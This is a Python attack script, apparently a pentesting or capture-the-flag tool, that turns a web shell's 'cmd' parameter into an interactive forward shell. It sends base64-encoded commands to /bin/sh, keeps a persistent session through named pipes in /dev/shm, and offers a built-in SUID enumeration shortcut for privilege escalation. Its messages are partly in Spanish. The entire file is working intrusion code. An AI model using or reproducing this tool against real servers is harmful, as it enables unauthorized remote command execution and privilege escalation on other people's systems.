#!/usr/bin/env python3

import requests
from termcolor import colored
import sys
import time
from base64 import b64encode
from random import randrange


class FordwardShell:

    def __init__(self):
        session = randrange(1000, 9999)
        self.main_url = "http://localhost/index.php"
        self.stdin = f"/dev/shm/{session}.input"
        self.stout = f"/dev/shm/{session}.output"
        self.help = {'enum suid': 'FileSystem SUID Privilege Enumeration', 'help': 'Show this help pannel'}
        self.is_pseudo_term = False


    def run_command(self, command):

        command = b64encode(command.encode()).decode()
    
        data = {
                'cmd':'echo %s |base64 -d | /bin/sh' % command
        }
        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text
        except: 
            pass
        return None
# mkfifo input; tail -f input | /bin/sh 2>&1 > output

    def write_stdin(self, command):

        command = b64encode(command.encode()).decode()
    
        data = {
                'cmd':'echo %s |base64 -d > %s' % (command, self.stdin)
        }
        r = requests.get(self.main_url, params=data)

    def read_stdout(self):
    
        for i in range(5):
            read_stout_command = f"/bin/cat {self.stout}"
            output_command = self.run_command(read_stout_command)
            time.sleep(0.2)

        return output_command


    def setup_shell(self):

        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stout) 
        self.run_command(command)

    def remove_data(self):

        remove_data = f"/bin/rm {self.stdin} {self.stout}"
        self.run_command(remove_data)

    def clear_output(self):

        clear_output = f"echo '' > {self.stout}"
        self.run_command(clear_output)

    def run(self):
        self.setup_shell()

        while True:
            command = input(colored("> ", 'blue'))
            
            if "script /dev/null -c bash" in command:
                self.is_pseudo_term = True
                print(colored(f"\n[!] Se ha iniciado una pseudo terminal\n", 'green'))

            if command.strip() == "enum suid":
                command = f"find / -perm -4000 2>/dev/null | xargs ls -l"
            
            if command.strip() == "help":
                print(colored("\n[!] Listando panel de ayuda: \n", 'yellow'))

                for key, value in self.help.items():
                    print(f"\n\t{key} - {value}\n")

                

                continue

            self.write_stdin(command +"\n")
            output_command = self.read_stdout()

            if command.strip() == "exit":
                self.is_pseudo_term = False
                print(colored(f"\n[!] Se ha salido de la pseudo-terminal\n", 'red'))
                self.clear_output()
                continue

            if self.is_pseudo_term:
                lines = output_command.split('\n')
                if len(lines) == 2:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1])
                elif len(lines) > 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])

                print("\n" + cleared_output + "\n")
            else:
                print(output_command)
            self.clear_output()

